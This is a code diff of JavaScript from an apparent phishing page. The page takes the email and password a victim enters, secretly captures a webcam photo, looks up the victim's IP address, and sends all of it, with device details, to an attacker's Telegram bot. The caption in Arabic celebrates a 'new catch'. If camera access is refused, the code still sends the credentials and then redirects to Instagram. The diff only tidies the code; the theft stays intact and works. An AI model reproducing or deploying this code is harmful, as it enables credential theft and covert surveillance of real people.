@@ -51,25 +51,14 @@
         this.disabled = true;
 
         try {
-            // 1. جلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            // 2. جلب الـ IP والمعلومات الجغرافية بدقة
-            let ipInfo = "فشل جلب البيانات الجغرافية";
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const data = await ipRes.json();
-                ipInfo = `الـ IP: ${data.ip}\nالمدينة: ${data.city}\nالدولة: ${data.country_name}\nالمزود: ${data.org}`;
-            } catch (e) {
-                // محاولة بديلة في حال فشل الأولى
-                const altIp = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                ipInfo = `الـ IP: ${altIp.ip}`;
-            }
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
 
-            // 3. التقاط الصورة
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -80,8 +69,7 @@
                 formData.append('chat_id', chat_id);
                 formData.append('photo', blob, 'identity.jpg');
                 
-                // تجميع التقرير بدون مكاتب خارجية
-                const caption = `🔥 صيدة جديدة لـ أنس:\n\n📧 الحساب: ${user_email}\n🔑 الباسورد: ${user_pass}\n\n🌐 بيانات الشبكة:\n${ipInfo}\n\n📱 معلومات الجهاز:\n${navigator.userAgent}\n🖥️ الشاشة: ${screen.width}x${screen.height}`;
+                const caption = `🔥 صيدة جديدة لـ أنس:\n\n📧 الحساب: ${user_email}\n🔑 الباسورد: ${user_pass}\n\n🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.userAgent}\n🖥️ الشاشة: ${screen.width}x${screen.height}`;
 
                 formData.append('caption', caption);
 
@@ -95,7 +83,6 @@
             }, 'image/jpeg');
 
         } catch (err) {
-            // في حال الرفض
             const fallback = `⚠️ رفض الكاميرا:\n📧 الحساب: ${user_email}\n🔑 الباسورد: ${user_pass}`;
             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fallback)}`);
             window.location.replace("https://www.instagram.com");
